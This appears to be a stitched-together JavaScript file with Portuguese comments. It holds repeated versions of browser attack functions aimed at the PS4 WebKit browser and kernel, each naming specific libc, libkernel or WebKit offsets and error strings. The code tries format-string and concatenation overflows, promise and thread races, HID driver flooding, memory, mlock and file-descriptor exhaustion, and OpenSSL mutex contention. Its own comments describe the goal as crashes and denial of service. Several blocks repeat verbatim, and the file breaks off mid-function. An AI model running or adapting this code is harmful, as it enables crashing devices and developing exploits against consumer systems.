            log("[KERNEL] Iniciando Kqueue Flood...");
            
            const div = document.createElement('div');
            let count = 0;
            
            const interval = setInterval(() => {
                // Adiciona e remove listeners freneticamente
                // Cada addEventListener regista um filtro no kqueue do processo
                for(let i=0; i<1000; i++) {
                    const fn = () => {};
                    div.addEventListener('click', fn);
                    // Não removemos imediatamente para aumentar a carga
                }
                
                // Limpeza em lote
                div.innerHTML = ""; // Tenta forçar limpeza de listeners associados
                
                count += 1000;
                if (count % 5000 === 0) log(`Listeners ciclados: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste Kqueue finalizado.");
                }
            }, 10);
        }

        // --- TESTE 6: TCP SYN Backlog Flood (Kernel) ---
        function runSynBacklog() {
            log("[KERNEL] Iniciando SYN Flood (Local)...");
            
            let count = 0;
            const interval = setInterval(() => {
                // Tenta conectar a IPs locais aleatórios
                // O Kernel envia SYN e aloca estrutura de conexão incompleta
                for(let i=0; i<50; i++) {
                    const ip = `127.0.0.${(count % 250) + 1}`;
                    const port = 8000 + (count % 1000);
                    
                    fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: AbortSignal.timeout(2000) })
                        .catch(()=>{});
                }
                
                count++;
                if (count % 100 === 0) log(`Tentativas de conexão: ${count * 50}`);
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Flood finalizado.");
                }
            }, 50);
        }



        // --- TESTE 1: Console sprintf_s Buffer Overflow ---
        // Alvo: "sprintf_s: buffer overflow" (LibcInternal)
        function runConsoleSprintf() {
            log("[WebKit] Atacando sprintf_s via Console...");
            
            // Cria uma string de formato e argumentos gigantes
            // O console.log usa formatação interna (ex: %s, %d) que chama sprintf
            const hugeString = "A".repeat(100 * 1024); // 100KB
            const format = "%s".repeat(1000); // 1000 substituições
            
            try {
                log("Enviando payload formatado...");
                // Passa 1000 argumentos gigantes para forçar overflow no buffer de formatação
                const args = new Array(1000).fill(hugeString);
                console.log(format, ...args);
                
                log("Console sobreviveu (Buffer truncado?).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: DOMTokenList strcat Overflow ---
        // Alvo: "strcat" (WebKit)
        function runClassListStrcat() {
            log("[WebKit] Atacando strcat via ClassList...");
            const el = document.getElementById('dummy');
            
            try {
                // DOMTokenList armazena classes como uma string única internamente separada por espaços
                // Adicionar classes força concatenação (strcat)
                const hugeClass = "cls_" + "X".repeat(50000);
                
                log("Concatenando 2000 classes gigantes...");
                
                // Adiciona massivamente para forçar realocação e concatenação
                for(let i=0; i<2000; i++) {
                    el.classList.add(hugeClass + i);
                }
                
                // Força serialização (leitura da string completa)
                const len = el.className.length;
                log(`ClassList length: ${len} (Seguro).`);
                
                el.className = ""; // Limpa
            } catch(e) {
                log("Erro ClassList: " + e.message);
            }
        }

        // --- TESTE 3: Promise 'Already Satisfied' Race ---
        // Alvo: "promise already satisfied" (LibcInternal)
        function runPromiseDoubleResolve() {
            log("[WebKit] Iniciando Promise Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Tenta resolver e rejeitar a mesma promessa simultaneamente
                    // em loop apertado para atingir a condição de corrida C++
                    for(let i=0; i<10000; i++) {
                        new Promise((resolve, reject) => {
                            // Race condition nativa
                            resolve(1);
                            reject(2);
                        }).catch(()=>{});
                    }
                    postMessage("Done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança múltiplos workers para aumentar a contenção no scheduler de Promises
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("Promise race em andamento...");
        }

        // --- TESTE 4: HID Driver Over-Write Pos (Kernel) ---
        // Alvo: "hmd_cr:over write pos %d" (Kernel)
        function runHIDOverwrite() {
            log("[KERNEL] Atacando HID Driver (HMD/Gamepad)...");
            
            // Tenta usar a API de Gamepad para enviar dados de vibração (escrita no driver)
            // Se o driver HMD compartilha código com o HID genérico, isso pode atingir o alvo.
            window.addEventListener("gamepadconnected", (e) => {
                log(`Gamepad ${e.gamepad.index} conectado. Iniciando Flood...`);
                
                const gp = e.gamepad;
                if (gp.vibrationActuator) {
                    setInterval(() => {
                        // Envia comandos de efeito rápido e sobrepostos
                        // Tenta estourar o buffer de comandos do driver
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            startDelay: 0,
                            duration: 1000,
                            weakMagnitude: 1.0,
                            strongMagnitude: 1.0
                        });
                        // Cancela imediatamente (Reset) e reenvia
                        gp.vibrationActuator.reset();
                    }, 1); // 1ms flood
                }
            });
            
            // Se não houver gamepad, tenta simular carga VR (se API existir)
            if (navigator.getVRDisplays) {
                navigator.getVRDisplays().then(displays => {
                    log("VR Displays query feita.");
                });
            }
            
            log("Aguardando interação do driver HID...");
            log("Pressione um botão no controle se nada acontecer.");
        }

        // --- TESTE 5: VM Budget mlock Exhaustion (Kernel) ---
        // Alvo: "vm.budgets.mlock_total" (Libkernel)
        function runMlockExhaustion() {
            log("[KERNEL] Esgotando mlock Budget...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            
            // Tenta alocar o máximo de memória Wasm possível.
            // Memória Wasm é frequentemente "pinned" (mlocked) para performance ou segurança JIT.
            const interval = setInterval(() => {
                try {
                    // Aloca 16MB (256 pages)
                    const mem = new WebAssembly.Memory({initial: 256});
                    memories.push(mem);
                    
                    if (memories.length % 10 === 0) log(`Memórias alocadas: ${memories.length} (aprox ${memories.length * 16} MB)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Tente interagir com o sistema agora (Menu PS).");
                }
            }, 100);
        }

        // --- TESTE 6: Pthread Internal Memory Error (Kernel) ---
        // Alvo: "Pthread Internal Memory Error" (Offset 0x40076)
        function runPthreadInternal() {
            log("[KERNEL] Triggering Pthread Internal Error...");
            
            // Worker que cria e destroi SABs e usa Atomics
            // O objetivo é corromper a estrutura interna da thread no Kernel
            const workerCode = `
                onmessage = (e) => {
                    const sab = new SharedArrayBuffer(1024);
                    const view = new Int32Array(sab);
                    
                    // Espera fantasma
                    Atomics.wait(view, 0, 0, 1);
                    
                    // Suicídio rápido
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            // Criação/Destruição de threads em velocidade máxima
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    const w = new Worker(url);
                    w.postMessage("die");
                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
                }
                count += 10;
                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Pthread stress finalizado.");
                }
            }, 10);
        }
// --- TESTE 1: sprintf_s Precision Overflow ---
        // Alvo: Libc Offset 0xD82B0 ("sprintf_s: buffer overflow")
        function runSprintfAttack() {
            log("[WebKit] Atacando sprintf_s com precisão...");
            
            try {
                // Tenta usar o especificador de precisão (%.Ns) para forçar
                // o sprintf a alocar padding interno gigantesco.
                // Se a implementação não verificar o tamanho do padding + string...
                const val = 1.2345;
                
                log("Enviando console.log com precisão 1.000.000...");
                
                // Formatação: %f com precisão absurda
                // O WebKit passa isso para snprintf/sprintf_s da libc
                console.log("Attack: %1000000.1000000f", val);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: URI strcat_s Buffer Too Small ---
        // Alvo: Libc Offset 0xD831C ("strcat_s: buffer too small")
        function runStrcatURI() {
            log("[WebKit] Atacando strcat_s em URI...");
            
            // decodeURIComponent usa buffers internos para reconstruir a string
            // Vamos criar uma string que expande drasticamente
            const part = "%25".repeat(10000); // 3 chars viram 1 (Decresce)
            // Mas se usarmos codificação inválida que força cópia sem conversão?
            
            // Tenta estourar o buffer de destino com URI malformada gigante
            const huge = "A".repeat(50000) + "%E0%A4%A"; // Sequência incompleta no fim
            
            try {
                log("Decodificando URI malformada gigante...");
                decodeURIComponent(huge);
                log("Decode OK.");
            } catch(e) {
                log("URIError (Seguro): " + e.message);
            }
        }

        // --- TESTE 3: Promise 'Already Satisfied' Race ---
        // Alvo: Libc Offset 0xEDD38 ("promise already satisfied")
        function runPromiseRace() {
            log("[WebKit] Forçando Promise Race Condition...");
            
            const workerCode = `
                onmessage = () => {
                    // Loop infinito de criação de promises com resolução concorrente
                    for(let i=0; i<5000; i++) {
                        let r, j;
                        const p = new Promise((res, rej) => { r = res; j = rej; });
                        
                        // Tenta resolver e rejeitar ao mesmo tempo em microtasks
                        // A libc reclama de "already satisfied" se a flag de estado não for atómica
                        queueMicrotask(() => r(1));
                        queueMicrotask(() => j(2));
                    }
                    postMessage("Done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("10 Workers a disputar estados de Promise.");
        }

        // --- TESTE 4: HMD/HID Over-Write Pos ---
        // Alvo: Kernel Offset 0xB27FA3 ("hmd_cr:over write pos %d")
        // Este erro indica overflow num ring buffer de comandos HID/VR.
        function runHIDFlood() {
            log("[KERNEL] Inundando Driver HID/HMD...");
            
            window.addEventListener("gamepadconnected", (e) => {
                const gp = e.gamepad;
                log("Gamepad encontrado. Iniciando Flood de Vibração...");
                
                // O driver tem um buffer de comandos.
                // Enviar comandos mais rápido do que o hardware processa causa "overwrite pos"
                setInterval(() => {
                    if (gp.vibrationActuator) {
                        // Comandos complexos variados para encher o buffer
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            duration: Math.random() * 100,
                            strongMagnitude: Math.random(),
                            weakMagnitude: Math.random()
                        });
                        // Reset imediato (outra escrita no registro)
                        gp.vibrationActuator.reset();
                    }
                }, 0); // Oms = Máxima velocidade
            });
            
            log("Pressione um botão no controle para ativar o driver.");
        }

        // --- TESTE 5: vm.budgets.mlock Exhaustion ---
        // Alvo: Libkernel Offset 0x3B4A2 ("vm.budgets.mlock_total")
        function runMlockExhaust() {
            log("[KERNEL] Esgotando memória mlock (Wired)...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const allocs = [];
            // Páginas de 64KB
            // O sistema tem um limite rígido de memória 'wired' (não swap)
            // Wasm SharedMemory usa mlock
            const interval = setInterval(() => {
                try {
                    // Tenta alocar 64MB por vez
                    const mem = new WebAssembly.Memory({initial: 1000, shared: true});
                    allocs.push(mem);
                    
                    // Acessa para forçar page fault e bloqueio real na RAM
                    new Int32Array(mem.buffer)[0] = 1;
                    
                    log(`Alocados: ${allocs.length * 64} MB (Wired)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Tente abrir o menu rápido agora (Pode estar travado).");
                }
            }, 100);
        }

        // --- TESTE 6: Pthread Internal Memory Error ---
        // Alvo: Libkernel Offset 0x40076 ("Pthread Internal Memory Error")
        // Ocorre quando a estrutura interna da thread corrompe.
        function runPthreadCrash() {
            log("[KERNEL] Disparando Erro Interno Pthread...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(1024);
            const view = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const view = new Int32Array(e.data);
                    // Entra em espera atómica
                    Atomics.wait(view, 0, 0, 100);
                    // Sai e morre imediatamente
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // O erro interno geralmente ocorre na destruição rápida de threads
            // que ainda têm recursos de sincronização pendentes
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    const w = new Worker(url);
                    w.postMessage(sab);
                    // Termina antes que o Atomics.wait termine naturalmente
                    w.terminate(); 
                }
                count += 20;
                if (count % 200 === 0) log(`Threads mortas: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste Pthread finalizado.");
                }
            }, 50);
        }
// --- TESTE 1: sprintf_s Precision Overflow ---
        // Alvo: Libc Offset 0xD82B0 ("sprintf_s: buffer overflow")
        function runSprintfAttack() {
            log("[WebKit] Atacando sprintf_s com precisão...");
            
            try {
                // Tenta usar o especificador de precisão (%.Ns) para forçar
                // o sprintf a alocar padding interno gigantesco.
                // Se a implementação não verificar o tamanho do padding + string...
                const val = 1.2345;
                
                log("Enviando console.log com precisão 1.000.000...");
                
                // Formatação: %f com precisão absurda
                // O WebKit passa isso para snprintf/sprintf_s da libc
                console.log("Attack: %1000000.1000000f", val);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: JSC op_strcat Side-Effect Crash ---
        // Alvo: WebKit Offset 0x2BA18D7 ("**strcat", "op_strcat")
        // O JSC usa op_strcat para o operador '+'.
        function runOpStrcatCrash() {
            log("[WebKit] Atacando op_strcat com Side-Effects...");
            
            let evil = {
                toString: function() {
                    // Esvazia a memória ou altera o estado durante a concatenação
                    log("Side-effect durante strcat! Alocando lixo...");
                    // Tenta forçar GC ou realocação
                    let junk = new Array(10000).fill(1.1);
                    return "EVIL";
                }
            };

            try {
                // Cria muitas strings para forçar o motor a criar uma RopeString complexa
                let a = "A".repeat(1000);
                let b = "B".repeat(1000);
                
                log("Executando concatenação hostil...");
                // A ordem importa: (String + Object) chama toString() do Object
                // O motor já pode ter alocado buffer para 'a' e 'b', mas 'evil' muda o estado
                let res = a + b + evil + a + b;
                
                log("Concatenação OK (Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Future 'Already Retrieved' Race ---
        // Alvo: Libc Offset 0xEDD1F ("future already retrieved")
        // Sugere uso de std::future/promise C++ onde o estado é corrompido.
        function runFutureRace() {
            log("[WebKit] Forçando Future Race Condition...");
            
            // Usamos MessageChannel para simular promessas cross-thread que usam a infra do Kernel
            const ch = new MessageChannel();
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const view = new Int32Array(e.data);
                    // Tenta "recuperar o futuro" (wait) massivamente
                    for(let i=0; i<1000; i++) {
                        Atomics.wait(view, 0, 0, 1); // Timeout curto
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers competindo pelo mesmo endereço de memória (Future)
            for(let i=0; i<4; i++) {
                new Worker(url).postMessage(sab);
            }
            
            // Na thread principal, acorda (satisfaz a promessa) e dorme rapidamente
            let interval = setInterval(() => {
                Atomics.notify(view, 0, 1);
                // Tenta criar confusão de estado
                Atomics.store(view, 0, (Math.random() * 100)|0);
            }, 0);
            
            setTimeout(() => { clearInterval(interval); log("Race finalizada."); }, 3000);
        }

        // --- TESTE 4: HMD/HID Over-Write Pos ---
        // Alvo: Kernel Offset 0xB27FA3 ("hmd_cr:over write pos %d")
        // Indica estouro de buffer circular no driver VR/HID.
        function runHIDFlood() {
            log("[KERNEL] Inundando Driver HID/HMD...");
            
            // Tenta ativar o driver VR mesmo sem headset
            if (navigator.getVRDisplays) {
                navigator.getVRDisplays().then(displays => {
                    log(`VR Displays: ${displays.length}. Atacando driver...`);
                    // O simples fato de chamar isso carrega o módulo HMD no kernel
                });
            }

            // Ouve gamepads (que partilham o subsistema HID)
            window.addEventListener("gamepadconnected", (e) => {
                const gp = e.gamepad;
                log(`Gamepad ${gp.index} conectado. Iniciando Flood...`);
                
                // Enviar comandos mais rápido do que o hardware processa causa "overwrite pos"
                setInterval(() => {
                    if (gp.vibrationActuator) {
                        // Comandos complexos para encher o buffer de comandos
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            duration: 2000,
                            strongMagnitude: 1.0,
                            weakMagnitude: 1.0
                        });
                        // Reset imediato (tenta sobrescrever a posição de leitura do driver)
                        gp.vibrationActuator.reset();
                    }
                }, 1); // 1ms = velocidade máxima
            });
            
            log("Pressione um botão no controle para injetar comandos HID.");
        }

        // --- TESTE 5: vm.budgets.mlock Exhaustion ---
        // Alvo: Libkernel Offset 0x3B4A2 ("vm.budgets.mlock_total")
        function runMlockExhaust() {
            log("[KERNEL] Esgotando memória mlock (Wired)...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const allocs = [];
            // O sistema tem um limite rígido de memória 'wired'
            // Tenta alocar o máximo possível
            const interval = setInterval(() => {
                try {
                    // Aloca 32MB por vez (SharedMemory usa mlock em muitas implementações)
                    const mem = new WebAssembly.Memory({initial: 500, shared: true});
                    allocs.push(mem);
                    
                    // Acessa para forçar page fault e bloqueio real na RAM
                    new Int32Array(mem.buffer)[0] = 1;
                    
                    log(`Alocados: ~${allocs.length * 32} MB (Wired)`);
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema deve estar instável (Swap bloqueado).");
                }
            }, 50);
        }

        // --- TESTE 6: Pthread Internal Memory Error ---
        // Alvo: Libkernel Offset 0x40076 ("Pthread Internal Memory Error")
        // Este erro ocorre em 'thr_list.c', sugerindo corrupção da lista de threads.
        function runPthreadCrash() {
            log("[KERNEL] Disparando Erro Interno Pthread...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Define dados específicos da thread (TLS)
                    // Tenta alocar memória interna na estrutura da thread
                    try {
                        const local = new Float64Array(1000); 
                        local.fill(Math.random());
                        throw "ForceUnwind"; // Força limpeza de stack/TLS
                    } catch(x) {}
                    
                    close(); // Suicídio
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Criação e destruição massiva de threads
            // O objetivo é corromper a lista ligada de threads ativas no Kernel
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    const w = new Worker(url);
                    w.postMessage("die");
                    // Não terminamos com w.terminate() aqui para deixar o worker chamar close()
                    // e passar pelo caminho de saída normal do pthread (thr_exit)
                }
                count += 50;
                if (count % 500 === 0) log(`Threads recicladas: ${count}`);
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("Pthread stress finalizado.");
                }
            }, 20);
        }
// --- TESTE 1: Future 'Resource Error' Race ---
        // Alvo: Libc Offset 0xED3AA ("thread resource error")
        // Ocorre quando std::thread ou std::future falham ao alocar recursos.
        function runFutureLock() {
            log("[WebKit] Esgotando recursos de Thread/Future...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Cria muitas Promises (que usam microtasks e recursos de async)
                    // Tenta forçar erro de recurso na criação de threads implícitas
                    const p = [];
                    for(let i=0; i<5000; i++) {
                        p.push(Promise.resolve(i).then(v => v*2));
                    }
                    Promise.all(p).then(() => postMessage("OK"));
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível para consumir recursos de thread
            // O PS4 tem um limite baixo de threads por processo web.
            for(let i=0; i<30; i++) {
                try { new Worker(url).postMessage("go"); } catch(e) { log("Limite Workers atingido: " + e); break; }
            }
            log("Stress de Futures iniciado.");
        }

        // --- TESTE 2: gets_s Short Buffer Overflow ---
        // Alvo: Libc Offset 0xD80EC ("gets_s: short buffer")
        // gets_s é usado para ler input de usuário de forma segura, mas a string de erro sugere falha.
        function runGetsAttack() {
            log("[WebKit] Atacando gets_s via Prompt UI...");
            
            // Cria uma string gigante para injetar em qualquer campo de input
            const payload = "OVERFLOW_" + "A".repeat(8192); // 8KB
            
            try {
                // 'prompt' é uma das poucas funções síncronas que usa buffers de texto do sistema
                // Se o buffer interno for menor que o payload e a verificação falhar...
                log("Abrindo prompt... (Não digite nada, apenas feche se aparecer)");
                
                // Nota: O prompt bloqueia o JS, mas o estouro ocorre na preparação da janela
                const res = prompt("Injecting Payload...", payload);
                
                log("Prompt retornou (Seguro).");
            } catch(e) {
                log("Erro Prompt: " + e.message);
            }
        }

        // --- TESTE 3: strcat_s Bad Destination ---
        // Alvo: Libc Offset 0xD82E2 ("strcat_s: bad destination argument")
        function runStrcatBadDest() {
            log("[WebKit] Atacando strcat_s (Destination)...");
            
            // Tenta corromper a concatenação de strings na barra de título ou status
            const hugeTitle = "T".repeat(1024 * 100); // 100KB
            
            try {
                // Definir document.title força uma cópia para o processo da UI
                // Se o buffer de destino for inválido ou pequeno...
                document.title = hugeTitle;
                
                // Tenta também History API que concatena URLs
                history.replaceState(null, hugeTitle, "#" + hugeTitle);
                
                log("Strings enviadas ao sistema.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: OpenSSL Rand Mutex Deadlock ---
        // Alvo: Kernel Offset 0xB3480E ("openssl:stl_wrapper.c:_rand_mtx_lock()")
        // O log mostra que o OpenSSL usa um wrapper STL com mutex para números aleatórios.
        function runCryptoLock() {
            log("[KERNEL] Atacando OpenSSL Mutex...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(4096);
                    // Loop infinito de pedidos de entropia
                    // Martela o _rand_mtx_lock encontrado no log
                    while(true) {
                        crypto.getRandomValues(buf);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers competindo pelo MESMO mutex global do OpenSSL no Kernel
            for(let i=0; i<20; i++) new Worker(url).postMessage("start");
            
            log("20 Workers em contenção no OpenSSL.");
        }

        // --- TESTE 5: scePthreadSetspecific Memory Error ---
        // Alvo: Libkernel Offset 0x41B09 ("scePthreadSetspecific Internal Memory Error")
        // Isso refere-se ao TLS (Thread Local Storage).
        function runTLSCrash() {
            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
            
            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
            const workerCode = `
                onmessage = () => {
                    try {
                        const formatters = [];
                        // Cria milhares de formatadores únicos
                        // Cada um pode alocar slots no TLS ou heap associado à thread
                        for(let i=0; i<5000; i++) {
                            // Locale complexo para forçar alocação
                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
                        }
                    } catch(e) {}
                    // Morre com recursos alocados
                    close(); 
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Ciclo rápido de criação/destruição de threads com carga de TLS
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
                count += 10;
                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
                if (count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: 'Too Many Files' FD Exhaustion ---
        // Alvo: Libc Offset 0xEE48A ("too many files open")
        // Queremos atingir esse erro exato para provar a exaustão.
        function runFDSlam() {
            log("[KERNEL] Iniciando FD Grand Slam...");
            
            const resources = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // 1. MessageChannel (2 FDs cada)
                    const mc = new MessageChannel();
                    resources.push(mc);
                    count += 2;
                    
                    // 2. Fetch (1 Socket FD) - Mantém conexão aberta
                    fetch("/fd_test_" + count).catch(()=>{});
                    count++;
                    
                    // 3. WebSocket (1 Socket FD)
                    // const ws = new WebSocket("ws://127.0.0.1"); // Opcional, consome mais recurso
                    
                    if (count % 500 === 0) log(`Descritores abertos: ~${count}`);
                    
                } catch(e) {
                    // Se pegarmos o erro, sucesso!
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema em estado de negação de serviço (IO).");
                }
            }, 1);
        }
// --- TESTE 1: Future 'Resource Error' Race ---
        // Alvo: Libc Offset 0xED3AA ("thread resource error")
        // Ocorre quando std::thread ou std::future falham ao alocar recursos.
        function runFutureLock() {
            log("[WebKit] Esgotando recursos de Thread/Future...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Cria muitas Promises (que usam microtasks e recursos de async)
                    // Tenta forçar erro de recurso na criação de threads implícitas
                    const p = [];
                    for(let i=0; i<5000; i++) {
                        p.push(Promise.resolve(i).then(v => v*2));
                    }
                    Promise.all(p).then(() => postMessage("OK"));
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível para consumir recursos de thread
            // O PS4 tem um limite baixo de threads por processo web.
            for(let i=0; i<30; i++) {
                try { new Worker(url).postMessage("go"); } catch(e) { log("Limite Workers atingido: " + e); break; }
            }
            log("Stress de Futures iniciado.");
        }

        // --- TESTE 2: gets_s Short Buffer Overflow ---
        // Alvo: Libc Offset 0xD80EC ("gets_s: short buffer")
        // gets_s é usado para ler input de usuário de forma segura, mas a string de erro sugere falha.
        function runGetsAttack() {
            log("[WebKit] Atacando gets_s via Prompt UI...");
            
            // Cria uma string gigante para injetar em qualquer campo de input
            const payload = "OVERFLOW_" + "A".repeat(8192); // 8KB
            
            try {
                // 'prompt' é uma das poucas funções síncronas que usa buffers de texto do sistema
                // Se o buffer interno for menor que o payload e a verificação falhar...
                log("Abrindo prompt... (Não digite nada, apenas feche se aparecer)");
                
                // Nota: O prompt bloqueia o JS, mas o estouro ocorre na preparação da janela
                const res = prompt("Injecting Payload...", payload);
                
                log("Prompt retornou (Seguro).");
            } catch(e) {
                log("Erro Prompt: " + e.message);
            }
        }

        // --- TESTE 3: strcat_s Bad Destination ---
        // Alvo: Libc Offset 0xD82E2 ("strcat_s: bad destination argument")
        function runStrcatBadDest() {
            log("[WebKit] Atacando strcat_s (Destination)...");
            
            // Tenta corromper a concatenação de strings na barra de título ou status
            const hugeTitle = "T".repeat(1024 * 100); // 100KB
            
            try {
                // Definir document.title força uma cópia para o processo da UI
                // Se o buffer de destino for inválido ou pequeno...
                document.title = hugeTitle;
                
                // Tenta também History API que concatena URLs
                history.replaceState(null, hugeTitle, "#" + hugeTitle);
                
                log("Strings enviadas ao sistema.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: OpenSSL Rand Mutex Deadlock ---
        // Alvo: Kernel Offset 0xB3480E ("openssl:stl_wrapper.c:_rand_mtx_lock()")
        // O log mostra que o OpenSSL usa um wrapper STL com mutex para números aleatórios.
        function runCryptoLock() {
            log("[KERNEL] Atacando OpenSSL Mutex...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(4096);
                    // Loop infinito de pedidos de entropia
                    // Martela o _rand_mtx_lock encontrado no log
                    while(true) {
                        crypto.getRandomValues(buf);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers competindo pelo MESMO mutex global do OpenSSL no Kernel
            for(let i=0; i<20; i++) new Worker(url).postMessage("start");
            
            log("20 Workers em contenção no OpenSSL.");
        }

        // --- TESTE 5: scePthreadSetspecific Memory Error ---
        // Alvo: Libkernel Offset 0x41B09 ("scePthreadSetspecific Internal Memory Error")
        // Isso refere-se ao TLS (Thread Local Storage).
        function runTLSCrash() {
            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
            
            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
            const workerCode = `
                onmessage = () => {
                    try {
                        const formatters = [];
                        // Cria milhares de formatadores únicos
                        // Cada um pode alocar slots no TLS ou heap associado à thread
                        for(let i=0; i<5000; i++) {
                            // Locale complexo para forçar alocação
                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
                        }
                    } catch(e) {}
                    // Morre com recursos alocados
                    close(); 
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Ciclo rápido de criação/destruição de threads com carga de TLS
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
                count += 10;
                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
                if (count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: 'Too Many Files' FD Exhaustion ---
        // Alvo: Libc Offset 0xEE48A ("too many files open")
        // Queremos atingir esse erro exato para provar a exaustão.
        function runFDSlam() {
            log("[KERNEL] Iniciando FD Grand Slam...");
            
            const resources = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // 1. MessageChannel (2 FDs cada)
                    const mc = new MessageChannel();
                    resources.push(mc);
                    count += 2;
                    
                    // 2. Fetch (1 Socket FD) - Mantém conexão aberta
                    fetch("/fd_test_" + count).catch(()=>{});
                    count++;
                    
                    // 3. WebSocket (1 Socket FD)
                    // const ws = new WebSocket("ws://127.0.0.1"); // Opcional, consome mais recurso
                    
                    if (count % 500 === 0) log(`Descritores abertos: ~${count}`);
                    
                } catch(e) {
                    // Se pegarmos o erro, sucesso!
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema em estado de negação de serviço (IO).");
                }
            }, 1);
        }
 // --- TESTE 1: TLS 'alloca' Stack Clash ---
        // Alvo: "allocate_tls_block_to_dtv" com trigger "alloca".
        // Tenta colidir a stack com o bloco TLS recém alocado.
        function runTLSStackSmash() {
            log("[WebKit] Iniciando TLS Stack Clash...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl usa muito TLS (Thread Local Storage) para cache
                    const formatters = [];
                    // Aloca TLS
                    for(let i=0; i<100; i++) formatters.push(new Intl.NumberFormat('en'+i));
                    
                    // Agora expande a stack violentamente para tentar atingir o TLS
                    function smash(depth) {
                        const junk = new Float64Array(100); // Aloca na stack
                        if (depth > 0) smash(depth - 1);
                        else postMessage("Stack Limit Hit");
                    }
                    try { smash(10000); } catch(e) { postMessage("Erro: " + e); }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers para criar pressão no TLS
            for(let i=0; i<10; i++) new Worker(url).postMessage("go");
            log("Workers atacando TLS/Stack boundary.");
        }

        // --- TESTE 2: CodeBlock Profile Allocation Overflow ---
        // Alvo: "JSC::UnlinkedCodeBlock::allocateSharedProfiles".
        // Tenta estourar a alocação de perfis de código compilado.
        function runProfileOverflow() {
